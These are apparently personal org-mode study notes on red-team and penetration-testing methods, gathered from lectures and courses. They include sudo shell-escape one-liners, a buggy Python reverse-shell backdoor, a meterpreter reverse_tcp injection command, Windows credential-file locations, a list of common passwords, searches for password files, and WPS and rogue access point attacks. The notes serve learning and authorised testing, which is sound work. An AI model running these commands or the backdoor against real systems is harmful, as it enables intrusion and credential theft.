#+TAGS: red_team


* Red Team
* Process
** Recon
*** Tools
- nmap
- recon-ng
- httrack
- tinfoleak
- theHarvester
**** Geoip - python
- this lib is used to pull data from the mindmax db
- first we need the midmax db
#+BEGIN_SRC sh
wget -N -q http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
gzip -d GeoLiteCity.dat.gz
pip install geoip
#+END_SRC
- for examples of use
https://github.com/appliedsec/pygeoip/wiki
*** Web Tools
- haveibeenpwned.com

** [[file://home/crito/org/tech/security/security_concepts/enumeration.org][Enumeration]]
** Service/Device Analysis
- Web
- Database
- Mail
- Firewall
- WAF
Run an analysis on all services/devices of intrest

** Exploitation
*** Passwords
**** Cmds
- [[file://home/crito/org/tech/security/security_tools/hashcat.org][hashcat]]
- [[file://home/crito/org/tech/security/security_tools/john_the_ripper.org][John the Ripper]]
**** Links
[[http://www.adeptus-mechanicus.com/codex/jtrhcmkv/jtrhcmkv.php][John the Ripper and Hashcat - Markov Mode Comparison]]
** Priv Escalation
*** [[https://www.youtube.com/watch?v%3Ddk2wsyFiosg&t%3D37s][Linux Privilege Escalation - Jake Williams]]

- Only root users can:
  - Effectively hide
  - Bind ports below 1024
  - Read/Write any file
  - Persist easily between reboots
    
+ Binary exploits (shellcode) should be a last resort
  - Some priv escalation is a waiting game
    - writing a file to a cron.d directory
    - Must wait for crond to restart
    
- Kernel issues
  - uname -a
  - /etc/release
  - /etc/issue
  
- LMGFY to find known issues with these kernels and releases
  
+ Just because you find a kernel exploit doesn't mean you should use it
  - it might not be stable; immediate crash
  - You might get root and then crash the box
  - The exploit might have undesirable artifacts that get you caught

+ Simpler exploits are always better
  
+ Exploiting a vuln program running as root gives you root
  - Look for web servers, mail servers as a command injection here gives you root privs

+ Binary exploits of a root owned program are far less dangerous than a kernel exploit
  - Even if service crashes, the machine doesn't
  - Services probably will auto-restart

+ Trivially vuln setuid programs
  - run the ltrace cmd against any setuid and setgid programs found
  - A rediculous number of these are homegrown and use the 'system' syscall
  - If they don't specify the path, you win
    
  - Look for setuid programs with:
   - find directory -user root -perm -4000 -exec ls -ld {} \; > /tmp/gaping-security-hole

+ Cron jobs
- Can you read cron files owned by other users?
- Even if not some careful scripting with ps can help you find frequently run jobs
- Are any scripts or binaries in cron jobs subject to tampering?
- What about cron files themselves?
- Can you write to a cron.d directory?

+ Weak Permissions on Scripts
  - If a script with user writeable permissions is invoked as root, it may be modified to run arbitrary commands
  - Always check both world writeable and user writeable permissions before admitting defeat

  - Don't jush check the scripts called by priv users, many of these call other scripts internally
    - And many of those have weak permissions 
      
+ Weak permissions on binaries
  - user writeable permissions on binaries are less common than on scripts
  - unlikely to find world writeable binaries
    - but grop writeable bins are not unheard of, esp in custom software
      
+ Weak permissions on LD_PRELOAD
  - The LD_PRELOAD environ variable is a way to load a specific version of a shared lib for a given application
    - LD_PRELOAD is ignored for setuid programs
      
  - However a program may be invoked as root and be vuln
    
+ That shouldn't be setuid/setgid
  - An amazing number of sysads don't understand what should and shouldn't be setuid
  - Any command in sudo that can edit or overwrite files is an ob risk
  - Users with restricted sudo access can use it to obtain unrestricted root perms
  - In performing incident response, we've also seen obscure editors with the setuid bit set  
  - This is presumably a backdoor for the attacker to regain root perms at will
  - We sincerely hope no sysadmins are stupid enough to have setuid perms on editors
  - using the :shell in vi provides a root shell  

+ Don't sudo less
  - The less tool often used to page files can invoke an editor
  - On some buntu sys the default nano
  - Many sys still use vi as an editor
  - less can use ed to drop into default editor, and if vi you can spwan a root shell
  
  - more cmd is just as bad as less
    - ? key to see options    
    - ! will invoke shell cmds on most sys
      - !bash
      
+ Don't sudo cp and mv
  - We can't think of a good reason for either
  - With sudo cp of sudo mv, you can overwrite /etc/shadow or other critical files and obtain bd access
    
+ Don't sudo find
  - The find cmd is often set with sudo perm so helpdesk can find and clean large temp files
  - Besides obs screw up ops, this is a big sec hole
  - find . -exec bash -i \;
    
+ Don't sudo script interpreters
  - All unsafe:
    - Python
    - Perl
    - Ruby
    - Lua
    - others...

- Perl
#+BEGIN_SRC pl
sudo perl
exec "/bin/bash";
#+END_SRC

- Ruby
#+BEGIN_SRC rb
sudo ruby
exec "/bin/bash"
#+END_SRC

- Python
#+BEGIN_SRC py
sudo python
import os
os.system('/bin/bash/')
#+END_SRC

** Maintaining Access 
** Covering Tracks
* Attacks
** Clickjacking
URL: https://www.owasp.org/index.php/Clickjacking

** Cold boot
** Command Injection
- using hex to move to the passwd file
#+BEGIN_SRC sh
2E2E2Fetc/passwd
#+END_SRC
 - /../etc/passwd
** Cookie-Stuffing
** Cross Site Request Forgery (CSRF)
*** [[https://www.youtube.com/watch?v=iY74zUB6Mpk][Cross-Site Request Forgery Attack Lecture - Kevin Du]]
- Countermeasures against CSRF Attacks
  - Secret Token
  - do not attach cookies for Cross-Site requests
    - this could break functionality (this is an extreme measure)
  - Same-Site Cookie
** [[file://home/crito/org/tech/security/attacks/xss.org][Cross Site Scripting (XSS)]]
** Cross Site Tracing (XST)
** DLL injection
** Drity Cow
Github: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Github: [[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs][List of POC]]

** Evil Maid
** Heartbleed
** HTTP Response Splitting
** Local File Inclusion Vulnerability
** Man in the Middle
** Pixie Dust Attack
- Wifi Protected Setup (WPS)
- Uses a PIN to allow access to home network

- 8 digits - 7 | 1 - checksum
  - 7 -> 4 + 3
    
- Problem is how the protocol generates the E S1 and E S2 values, pseudo random numbers
- Some vendors also implement the protocol poorly
- Broadlink uses the C rand() function
- Ralink never generates an E S1 or E S2 value and they remain 0

- if the random number state is recovered then E S1 and E S2 can be calculated
- PSK1 and PSK2 can be calculated from the E-hash1 and E-Hash2 values
*** aircrack
1. airmon
2. wash -i wlan0mon
3. Copy the ESSID
4. reaver -c 1 -i wlan0mon -b <essid> -vv -K 1
- if this fails you can always bruteforce the wps
#+BEGIN_SRC sh
reaver -c 1 -i wlan0mon -b E0:91:F5:6F:3F:C6 -vv
#+END_SRC

** Ruby attack
** RPCBomb
url: http://www.theregister.co.uk/2017/05/04/linux_rpcbind_vulnerability/
** Shellshock
** SMB Relay Attack

** SMTP Injection
* Code
** Python
*** Backdoor Shell
#+BEGIN_SRC py
#!/usr/bin/python
import subprocess #Process commands
import socket #Process socket data

host = '127.0.0.1' # Attack Machine
port = 443 # Attack Port
passwd = 's3cr3t' 

# chek password
def Login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() is passwd:
        Login()
    else:
        s.send("Connected #> ")
        shell()

# Execute shell cmds
def Shell();
    while True:
        data = s.recv(1024)

        if data.strip() == ":kill":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send("#> ")

# Start Script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()
#+END_SRC
* Databases
- NVD (National Vulnerability Database)
- Open Source Vulnerability Database
- 
* Lecture
** [[https://www.youtube.com/watch?v%3DgYOy7CGpPIU][The Making of atlas: Kiddie to Hacker in 5 Sleepless Nights]]
http://atlas.r470y.com/ - atlas blog   

- Tools
  - objdump - reads the headers of executables
    - objdump -x demystified - this will dump all headers
  - ReadElf
  - GDB
  - Ktrace/KDump
    
** [[https://www.youtube.com/watch?v%3D0fbBwGAuINw][How to Exploit Metasploitable 2 with NMap, Nexpose, Nessus and Metasploit]]

- getting a html report from nmap report
#+BEGIN_SRC sh
nmap -O -sV -sC -oX nmap-scan.xml 192.168.56.101
cp /usr/share/nmap/nmap.xsl .
#+END_SRC
We need the nmap.xsl as it is the stylesheet for the xml file

- Vulnerability Scanners
  - OpenVAS
  - Nessus
  - Nexpose
** [[https://www.youtube.com/watch?v%3D4uN44YfsQPk][The Wizard of Oz - Painting a Reality Through Deception - David Kennedy]]
- SE Attacks Explained
  1. Homework
  2. Threat Model
  3. Attack
  4. Persistence and Exfil
     
- email marketing or forward facing people to discover what company email looks like
  
- ms diagnostics - exploit vector
- excel macros - less so 
- hta files - exploit vector

- Sending the fish out
  - only send it to one person at a time - then wait 1hr before pushing to next person
    
- C & C
  - lateral movement to needed data
    
- snoof app - for spoofing phone numbers
  
- padgeant - putty feature that saves crts for ssh
** [[https://www.youtube.com/watch?v=xXqyogdxITE][The Dirty Little Secrets They Didn't Teach You In Pentesting Class]]
- Domain Admin or Bust
  - Usually this means adding yourself as one (aka fastest way to get caught)

- Pentesting Goals
  - What's out goal?
  - Vulnerability Driven vs Data Driven vs Capability Driven pentest/goal
  - What's a *good* goal?
    - Domain Admin is "A Goal" but it's a stupid goal
    - What makes the client money is a better goal (if you can identify it)
    -Problems arise in actually identifying this. What's important to testers vs client vs bad guys
    - Best goal, testing client's ability to detect and respond to various levels of attackers
      
- Majority of 'Pentesting' going on today

Run Scanner ---> Exploit ---> Report

this is useless, the evidence is need to identify where the failures occured

- A Better Way
  
Intelligence Gathering ---> Foot Printing ---> Vulnerability Analysis ---> Exploitation ---> Post-Exploitation ---> Clean up

- Actual Attack Scenarios

Prepwork/Analysis ---> Intel Gathering ---> Targeting ---> Exploitation ---> Post-Exploitation

- Prep Work
  - make your click scripts
  - update your stuff
  - have script and screen ready to go  

- Tips
  - screen/tmux so you don't lose your shell
  - use script to log all of the session
  - One of these passwords almost always works
    - password
    - Password
    - pssw0rd
    - Password123
    - welcome
    - welcome123
    - $Company1
    - $Comapany123
    - changeme123
    - p@ssw0rd
    - p@ssw0rd123
    - Username123
      
  - Nmap Scripts
    - Best scripts don't fire off automatically with "-A"
    - Some of the better scripts...
      - Citrix, NFS, AFP, SNMP, LDAP
      - Database coverage
      - http*
      - Losts of handy stuff, some overlap with MSF aux but some things sux doesn't have.
	
  - MSF Auxiliary Modules
    - Handles all the BS for you
    - Uses lib/rex == "Ruby EXploitation library"
      - Basic lib for most tasks
      - Sockets, protocols, command shell interface
      - SSL, SMB, HTTP, XOR, Base64, random text
      - Intended to be useful outside of the framework
    - Lib/rex ported to a ruby gem
      - can make use of rex outside of MSF
    - Designed to help with reconnaissance
    - Dozens of useful service scanners
    - Simple module format, easy to use
    - Specify THREADS for concurrency
      - Keep this under 16 for native Windows
      - 256 is fine on Linux
   - Uses RHOSTS instead of RHOST 	

- Post-Exploitation
  Mubix docs on post-exploitation
  - http://www.room362.com/blog/9/6/post-exploitation-command-lists.html
  - http://bitly.com/qrbKQP
    
  - Best persistence method?
    - Meterpreter
      - HTTPS
      - Pro's Persistence Agent
    - MOS_DEF?
      - Thunderbird SPAM Persistence
      - DNS, HTTP, HTTPS, etc
    - CORE Agent?
    - Wiz-bang custom binary/backdoor
    - RAT
  Better Method
    - RDP/VNC to outward facing box 
      - MyPasswords.txt will be kept on the fileshare somewhere

  - Send shells to team mates
    - run multi_meter_inject -pt windows/meterpreter/reverse_tcp -mr 1.2.3.4 -p 80
    - always have a spare shell
      
- Find Stuff Internally
  - Good
    - Nmap - up load to a target
    - Ping
    - Nessus 
    - Nexpose
    - "net view / domain"

  - Better
    - OSQL (MS binary should cause any problems to install)
      - osql -L 
         - will let you know all the SQL servers it knows about
         - can use it to connect to databases

    - DSQUERY / DSGET (annoying)
      - dsquery computer -limit 0 - current domain
      - dsquery user -limit 0
      - dsquery computer -limit 0 "DC=company,DC=net"
      - dsquery user -limit 0 "DC=company,DC=net" - other domains
    - the above can be done with adfind (this is DSQUERY on steroids)
      
    - nltest
      
  - BEST
    - Railgun - provides the windows API
    - NetDiscovery (part of MSF) - SQL, DC, UNIX, Novell selections
    - DomainDiscovery
      - what domains do you have acces to?
      - Are they domains?
      - What are the names of all their domain controllers? 
	
- User Discovery
  - Good
    - net group "domain admins" /domain
    - net group "domain admins" /domain:DM
    - net localgroup  Administrators
    - net group localgroup Administrators /domain
    - net user domainadmin_username /domain
    - net user username/domain
      
  - Better
  - Rpcclient
    - Enumerate users
      #+BEGIN_EXAMPLE
      #!/bin/bash
      for i in {500..600}
      do
        rpcclient -U "user%Password1" -W DOMAiN 1.2.3.4 -c "lookupsids S-1-5-21-1289870925-1615939633-2792171844-$i
      done	
      #+END_EXAMPLE
      
  - BEST
    - UserDiscovery
    - DisplaySessions
    - PVE-Find-AD-User
    
  - Creating Zombies
    - RunAs
      - ShellExecute
      - CreateProcessWith
      - Logon, LogonUser
    - WCE+ (can cause system to crash)
    - runhash32/64 - user level psexec == zombie user & token
      
  - Run executable in memory
  #+BEGIN_EXAMPLE
  meterpreter > execute -H -l -c -m -f bins/newbinary.exe
  #+END_EXAMPLE
  this will start a binary on the target remove and replace it with the desired binary on the host
  
- Privilege Escalation
  - Good
    - getsystem
      - use the options or you will use your shell
    - Post modules
      - Keyboard layout
      - Bypassuac
    - Core Impact /Canvas ship with locals
      
  - Better
    - DomainDrop

  - BEST
    - Just ask for it...
    - Ask module
    - Tasklist
      - tasklist /V /S $IP /U $user /P $password
    #+BEGIN_EXAMPLE
    for /F "skip=3 delims=\ " %A in ('net view') do tasklist /V /S %A /U $user /P $password
    #+END_EXAMPLE
    
- Finding the Gold
  - Dir /s "My Documents"
  - Dir /s "Desktop"
  - Dir /s *.pcf
  - ListDrives
    
Searching for files
  - dir c:\*password* /s
  - dir c:\*competitor* /s
  - dir c:\*finance* /s
  - dir c:\*risk* /s
  - dir c:\*assessment* /s
  - dir c:\*.key* /s
  - dir c:\*.ica /s
  - dir c:\*.crt /s
  - dir c:\*.log /s
  - dir c:\*.vsd /s
    
Searching in files
  - findstr
    - password
    - secret
    - confidential
    - account
      
  - Better
    - Dumplinks
    - GetFirefoxCreds
    - GetPidginCreds
    - Outlook, IE, Chrome, RDP Password Extraction
      - Basically the whole credentials post module section
    - SharePoint
    - Intranet.company.com
      
  - BEST
    - OpenDLP
    - Fiction's Database Searcher
    - Search in Meterpreter
      - Uses windows indexing ie outlook email
    - Dir /s $share > filetosearchoffline.txt
      - Findstr
	
- Pivoting
  - Portforwarding
    - Meterpreter portfwd
    - Route
    - Sock4a module + meterperter session
    - Pro VPN Pivot
  - Portproxy
    - Built into Windows
    #+BEGIN_EXAMPLE
    netsh interface protproxy>add v4tov4 listenport=25 connectionaddress=192.168.0.100 connectionport=80 protocol=tcp
    #+END_EXAMPLE
    will not show on netstat
  - Legitimate Access via VPN, Term Server, Citrix, etc
    
- Persistence
  - Autoruns
  - Smartlocker - http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html
  - Fxsst.dll
    - https://blog.mandiant.com/archives/1786
    - http://www.room362.com/blog/2011/6/27/fxsstdll-persistence-the-evil-fax-machine.html
  - gpo_dropper hbgary
  - IPv6 Dropper

https://github.com/mubix/Not-In-Pentesting-Class

** [[https://www.youtube.com/watch?v=PYwqyVlH8lQ][Security Testing Fundamentals - Ken van Wyk]]

- ccc paper on format strings vuln in C

- Testing Methods
  - Fuzzing
    - hit software with random/garbage data
    - look for unanticipated failure states
    - observe and record
    - MS estimate 20-25% of bugs found this way
  
    - Smart Fuzzing
      - check releveant rfc for required fields
        - what happens if missing, or more are added
    - Tools
      - OWASP's JBroFuzz
      - PEACH
      - SPI Fuzzer
	
  - Pen Testing
    
  - Dynamic Validation
    - Time to verify all those security requirements and functional specs
      
  - Risk-basd Testing
    - Start with abuse eases, weakness scenarios
    - Describe and script them
    - Try them one step at a time
      
  - Threat modeling
    - Who would attack us?
    - What are their goals?
    - What resources do they have?
    - How will they apply technology?
    - How much time do they have?

** [[https://www.youtube.com/watch?v=Q2WK5LpDbxw][Finding Bugs with Burp Plugins and Bug Bounty 101 - Monika Morrow and Ben Sadeghipour]]

- Why Burp Plugins
  - Automate testing of apps
  - Automate finding new vulns
    
- Burp Extender
  - Signigicantly expanded API
  - Multiple extension support
    
- source code for example plugins (these are in java, but other languages can be used)
  - https://github.com/monikamorrow
    

- Platforms 
  - BugCrowd - managed and unmanaged programs
  - CrodCurity
  - Synack - you have to sit an exam to become a researcher
  - HackerOne - managed and unmanaged programs
  
** [[https://www.youtube.com/watch?v=aNyK1yVLLRI&feature=youtu.be][The Bug Bounty Field Manual - Adam Bacchus]]
   
Docs: [[file://home/crito/Documents/Security/Red/Bug-Bounty-Field-Manual-complete-ebook.pdf][Bug Bounty Field Manual]]

** [[https://www.youtube.com/watch?v=9qeZBJuk6tg&t=16s][Advanced Hacking Workshop with Frans Rosen and Peter Yaworski]]
   
- Approach the target
  - swf always an indicator of vuln
    - ZeroClipboard.swf
    - flowplayer.swf
    - swfupload.swf
    - clippy.swf
    - jplayer.swf
    - amine.swf
    - Lime.swf
    - columns.swf
    - video.swf
    - video-js.swf
  - URL Validation  
    - difficult to inplement correctly
  - Open Redirects
    - why is the company trying to redirect me
  - Third party scripts
    - very good area as less worried over security
  - Subdomain Takeover
    - company stops hosting domain, but is still pointing to it
    - hosting comapnies heroku, aws, azure will allow you to take over these subdomains 
  
    
* Tutorial
** PluralSight - System Hacking - Dale Meredith

*** Intro

What to do before attack
+ recon & footprinting
    - ip range
    - Namespace
    - Public Data
+ Scanning
    - ID targets
    - ID services
    - ID O/S
+ Enumeration
    - User lists
    - Security flaws
    - Resources

What are our goals
+ Gain Access
+ Maintaining Access
+ Covering Tracks


**** Gaining Access
Complexity - MS you must use at least 3 of Upper case, Lower case, Numbers and Special characters
Password recovery time simulator - free

***** Architecture
****** Windows
Local machines: SAM Database - C:\windows\system32\config\sam
Stored as hashes - mounted as HKLM/SAM
Older machines may have C:\windows\repair with backups of passwords

Active Directory: ntds.dit - C:\windows\ntds
stores all passwords for domain controller     

****** Linux
/etc/shadow

****** OS X
/var/db/dslocal/nods/default/users

ophcrack to crack the hash - ophcrack has a live cd


****** Techniques Used
+ Dictionary Attack - Text files of words - Languages - Subjects
+ Brute-Force Attacks - Takes longer - beyond 14+ starts getting difficult
+ Syllable Attacks - Dictionary and brute-force attack
+ Hybrid Attacks - Dictionary using variation on numbers & special chars
+ Rule-Base Attacks - Using discovered rules to specify shape of password
+ Guessing - Using information gleaned to make educated guesses - social media etc
  
****** Types of Attacks
| Passive Online | Sniffing, MIM, Sidejacking(firesheep)             |
| Active Onle    | Hash injection, trojan/keylogger                  |
| Offline        | Rainbow, Distributed network, pre-computed hashes |
| Non-electronic | Dumpster diving, social engineering               |

Hashes 
LM Hash - des
+ LM Hash/NTLM stores passwords up to 14 chars
+ All characters are converted to UPPER case
+ Padded with blank characters to fill out all 14 chars.
+ Then split into 7 chars stings
+ Each 7 char string is then encrypted and combined back 

NTLM 1 - md4 NTLM 2 - md5
Bwayne:1005:85D8D0AEB8D112F8F9954FC9DF57E012:ED7B273FDE21FFE559AC8D1B9D3729BC:::
Administrator:500: xxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
Guest:501:NOPASSWORD**********************:NOPASSWORD*********************:::

Notes
+ 500 cid in MS is always admin
+ Any hash that ends with: AAD3B435B51404EE - last 7 chars blank
+ Any password with 15+ chars: the LM hash value is "dummied" with AAD3B435B51404EEAAD3B435B51404EE

****** NTLM Authentication
+ NTLM is used whtn 
  - There is no Kerberos trust between two different forests
  - Authentication is attempted by IP and not by DNS
  - If oe or both systems are not in the same domain
  - If your FW is blocking Kerberos ports
  
******* How it's used
+ Challenge response algorithm
+ Passwords are not transmitted
+ V1 came with NT - V2 cam with NT SP4

******* The Process

user enters pass -----> windows generates a hash
        |
        |
        ---------------------------------------------> Domain Controller
	                      Request                            |
          <-------------------------------------------------------	
                             hash sent by DC
       ---------------------------------------------------------->
                      hast and challenge sent back
		      
****** Kerberos Authentication - used on modern MS
+ Ticket based
+ Avoids transmitting passwords
+ Time based

1. user requests TGT 
2. DC issues TGT
3. TGT is presented to machines in the network to access services
PDC needs to be synced otherwise kerberose doesn't work

****** Salting 
+ Append or prepending random strings
+ done before hashing
+ prevents duplicate hashes
+ unique to each password
  
****** Rainbow tables
+ Precomputed hash tables
+ Huge files

+ website for checking hashes tobtu.com 
+ lm hash checking hashes rainbowrables.it64.com
+ dictionaries can be found at outpost9.com

**** Maintaining Access
     
+ Look around
  - config errors
  - design errors
  - layouts
  - programming flaws

***** Four Methods for Escalation
1. Pwn the admin/root acct
2. Take advantage of vuln
3. Fire up the sploit - alt to sploit - canvas, core-impact
4. Have a user do it for you!

***** Types of Escalation
+ Vertical - user gains admin level access
+ Horizontal - move to a user 
  
***** Counter Measures
+ encryption - encrypted hdd 
+ Least priv - don't over allocate a user
+ sw upto date
+ Limit interactive logon
+ Service accts are limited
+ Limit code that can run with privs

***** Slow down attacker
+ Priv separation approach
+ test os and app code before running
+ Multi-factor
+ Stress test code, apps befor deploying

**** Cover Tracks

** ISSA Web Pen-testing Workshop
*** [[https://www.youtube.com/watch?v%3DJPd2YtgJm8Q][Intro to Mutillidae, Burp Suite & Injection]]
*** [[https://www.youtube.com/watch?v%3DxSqw-KwQatI][Webshells]]
- on kali they are found in /usr/share/webshells

- weevely - github and kali more advanced webshell
  - instead of using puts ands gets it uses cookies
- neopi - 
*** [[https://www.youtube.com/watch?v%3DKJn2HIpFmO0][HTML & Javascript Injection]]
- burp sutie has a builtin decoder for encoding webshell code
*** [[https://www.youtube.com/watch?v%3Dt-44ZsaeIQE&t%3D3s][Beef Hooks]]
*** [[https://www.youtube.com/watch?v%3Dd71YfVR1eWA][JSON Injection]]

** Offensive Security 2013 - FSU
*** [[https://www.youtube.com/watch?v%3D4yNgP3CUOWo][Lecture 2: Linux Overview]]
*** [[https://www.youtube.com/watch?v%3D3y8JuixcSdU][Lecture 7: Fuzzing]]

- Exploitation Theory
  - Von Neumann Arch
    - unable to distinguish between data and instructions
    - instruction and data stores in same memory
      - this allows for the modification of code
  - Harvard Mode
    - this seperates out data and instruction into there own memory
      - this is implemented inside processors for specfic tasks, but not on whole systems
  - Other Architectures
    - Tagged Arch
    - Capablility Arch
    - Trusted Computing Base

- Exploits can be generalized into a three step process
1. Some sort of memory corruption
2. Change / hijack of control flow
3. Execution of the shellcode
   
- What is fuzzing?
  - The process of sending specific data to an application in hope to elicit certain responses
  - Specific?
    - Mutated data, generational data, edge cases, unanticipated datatypes, etc.
  - Certain?
    - crashes, errors, anomalous behaviour, different application states
      
- Fuzzing Phases
  1. Identify Target (application)
  2. Identify inputs
  3. Generate Fuzzed Data
     - Two methods for fuzzing data
      i) Generation
      ii) Mutation
  4. Execute Fuzzed Data
  5. Monitor for Exceptions
  6. Determine Exploitability
     
- Methods for generating fuzzed data
  - Generation fuzzing
  - Mutation fuzzing
    
- Generating fuzzed data
  - String repetitions
    - A*10, A*100, A*1000
  - Character translations
  - Directory Traversal
  - delimiters
  - Metacharacter / Command injection
    - sql -- comment
  - File types
  - Bit Flipping for protocol headers

Vulnerablility Scoring
http://www.first.org/cvss

HAOE book cd has a vanilla system that has a lot of the counter measures switched off 

** Offensive Security 2014 - FSU
Owen Redwood
*** [[https://www.youtube.com/watch?v%3Dlk3rp53b2NA][Lecture 1: Intro]]
- reading list
  - hacking the art of exploitation
  - the hacker's handbook to web applications

*** [[https://www.youtube.com/watch?v%3DlbjS2mXyMEQ][Lecture 2 - Secure Coding in C]]
- web tool that visuzlises code to assemby
  - http://gcc.godbolt.org
- reading list    
  - Secure Coding in C and C++ - Robert Seacord
    
http://websec.github.io/unicode-security-guide/character-transformations/

*** [[https://www.youtube.com/watch?v%3DyXX6DWFTLaQ][Lecture 3: Secure Coding in C cont]]
reading:
http://blog.reghr.org/archives/1054 - cryto lib bugs
http://www.cs.utah.edu/~regehr/papers/overflow12.pdf
http://floating-point-gui.
0x352 HAOE - Formatted Output Security
0x280 up to 0x300
0x350 up to 0x400

Race conditions
  - CVE-2007-4303
  - CVE-2007-4302

*** [[https://www.youtube.com/watch?v%3DMnmX911MqMU&t%3D3176s][Lecture 4]]
Links:
[[http://cve.mitre.org][Common Vulns and Exposures - CVE]]
[[http://cwe.mitre.org][Common Weakness Enumeration - CWE]]
[[http://cce.mitre.org][Common Configuration Enumeration - CCE]]
Seven kingdoms of exploit
[[http://nvd.nist.gov/home.cfm][National Vuln Database]]

CVEs
- list of information security vulns that aims to provide common names for publicly known problems
- Goal to make it easier to spread/share data
- Run by MITRE

Vuln - "is a mistake in software that can be directly used by a hacker to gain access to a system or network"

CCE
- Assigns unique identifiers to configuration guidance statements
  - The required permissions for accessing the directory %System Root%\System32\Setup should be "Administrator Account" only
  - The "account lockout threshold" for failed password attempts should be 3
  - For Linux, passwords should be stored in either SHA256 or SHA512 or the default DES formats and in the /etc/shadow file not the /etc/passwd file
    
CWE
- A softwate weakness is an error that may lead to a software vuln, such as those enumerated by the CVE list
- Examples software weaknesses include:
  - buffer overflows, format strings, etc
  - structure and validity problems; common special element manipulations
  - channel and path errors
  - handler errors
  - user interface errors
  - pathname traversal and equivalence errors
  - authentication errors
  - resource management errors

Code Nomenclature

Code ----> Bugs ----> Weaknesses ---- --> Exposures  -----> 
                                                            |                                     Exploited Vulns
							    ----   Vulns   ----------> 

Discovering Vulns
3 Primary Methods:

1. Source code Auditing
  - Requires Source Code
    
2. Reverse Engineering
  - Can be done withourt source code
  - Requires binary applications
  - very time consuming and requires high technical skill
    
3. Fuzzing
  - Lost of tools/Frameworks exist
  - Easy to make custom ones
  - Binary or source code availability is unimportant 
    
Auditing tools
- Author's source code comments
- Editors/Reading Tools
  - vi/emacs; source insight; eclipse; source-navigator
-Pattern matchng tools    
- Static analyzers
  - prone to missing vulns
  - prone to false pos+

Approaches
- Find the most bugs?
- Find the easiest to find bugs?
- Find the weaknesses that are most reliable to exploit?

It is important to limit the approach
 - will never have enough time to find all the bugs
   
General Methodology
1. Understand the Application
   - features
   - Architecture
     - what over services does the application require
   - Programming Lang
   - Compnents
      - DB - try to hit db for sqli
      - file shate - try to upload a file
     
2. Understand the Attack Surface
   - You must choose which ones to focus on 
     - Sabotage
       - defacing, attacker deleting records, altering them, destroying user trust
     - Gaining Access
       - attack / harass other users
       - botnet
       - identity theft
     - Piracy/theft

3. Target your efforts
   - depends on your style
     
Targeting: How to think like an attacker
  Traditional strategies:
    - ipurt sources related to code paths
    - target important components
      - security mechanisms
        - Auth
	- http/https
      - Data mgmt/DB
      - Interpreters (php)
    - Complex parsing, protocols or functions 
  Meta Targeting startegies
    - Start by looking at source code comments      
      - grep for:
        - fix this, todo!, xxx, *****
        - swearing/typos
        - old code
          - old libs
	- code checked in at 4am
	- code checked in at same time as other buggy code
	  
Reading Code
  - Review fewer than 200-400 lines of code at a time
  - Faster code review is not better
    - Optimal code review is around 300-500 loc
  - Never review code for more than 90 mins at a time
    -significant diminishing returns after this
  - Be thorough
    - vast majority of code is ok
  - Avoid making assumptions    
    - can cause you to miss bugs, or assume something is done correctly
  - Look for abstraction
    - switching between C and C++ styles of code
      - two different devs with different backgrounds > bugs
  - Focus on code patterns
    - copy paste chunks
      - forgetting to up chuck variables

-------------------------

Look up off by one errors
sizeof !=strlen
- size of bytes not elements
  
Programs in memory
- .txt section
   - contains machines intstructions
- .data section
   - global initialized variables
- .bss section
- heap section
- stack section
  
Gerenal Bug Categories 
1. API Based Bugs
2. Programming Construct Errors
3. State Mechanics
4. External Resource Interactions
-- refer to the seven kingdoms

*** Lecture 5
+ The Permissions Spectrum

- The Bios
  - The ultimate authority of hw
    
Boot Process
1. Bios
2. POST - Power On Self Test
   - CMOS
   - Hardware initialization
3. Bootloader 
4. OS
   
- The "Academic" Rings model
  - provide different levels of access
    3 - Normal non-root user applications
    2 - Device drivers (keyboard/mice/...)
    1 - Device drivers (video card, etc)
    0 - Kernel
    
- higher than ring 0
  - SMM (-2) System Management Mode - on intel chips
  - IPMI (-3) Intelligent Platform Management Interface
  - Bios (-1)

- The "Practical" Rings model
  -  4 - Sandboxed non-root user application
  -  3 - Normal non-root user applications
  -  0 - Kernel/root
  - -1 - Bios
  - -2 - SMM
  - -3 - IPMI
  - Physical Access
    
- Pivoting - Priv Esc to remote system
  - use one node to gain access to other nodes on the nextwork
  - Lateral movement 
    - Pass the Hash
      
- /etc/shadow
  - options for hashes
    - $1$ - it uses MD5 - no longer secure
    - $5$ - it uses SHA-256
    - $6$ - it uses SHA-512
    - $2a# - it uses blowfish
- otherwise it uses DES - considered no longer secure
  
- The least privilege principle
  - every process/user/program mush be able to access only the info and resources that are necessary for its legitimate purpose
    - no-login user accounts for services
    - jails
    - security in depth
    - makes logs cleaner
      
- setuid as root programs
  - theses programs have complete access on a UNIX system
  - virtually every attack chain involves a focus on attacking these programs
    - they are the single points of failure
    - once attackers get any form of access, they want to esc to root
      
- Priv Esc Attack Surface
  - sudi priv escs
  - kernel priv escs
  - daemon exploits / root process exploits
  - weak passwords
    
- logs
  - brute force attempts leave a big footprint
  - remote logins
  - system modifications
  - kernel modification
  - daemon logs
  - module loading/unloading
  - FW/Gateway/traffic logs
    - IDS
    - IPS
  - AD/LDAP/SCP    

*** Lecture 6
** CBT Nuggets Kali Linux 
*** Welcome to the tools of kali linux
*** What is BackTrack
*** Bypassing Wireless Mac Filtering
  - Find the AP
    - airmon-ng & airodump-ng
  - Find an associated client
    - airodump-ng
  - Borrow the MAC address - macchanger
    
- Hidden ssid will show with the <length: 0> in airodump-ng
  
- connecting with specific ssid with ifconfig
#+BEGIN_SRC sh
iwconfig wlan0 essid my_ssid_here channel 1
#+END_SRC

- just show the clients of an AP
#+BEGIN_SRC sh
airodump-ng -c 1 -a --bssid 00:18:11:60:17:3F wlan0mon
#+END_SRC
-a specifies that only clients should be shown

- change mac addr
#+BEGIN_SRC sh
macchanger -m 56:55:CA:F2:6F:AF wlan0
#+END_SRC

*** Rogue Access Point
- tools:
  - airmon-ng
  - airbase-ng
  - dhcpd3

- dhcpd.conf
#+BEGIN_SRC sh
ddns-update-style ad-hoc;
default-lease-time 600;
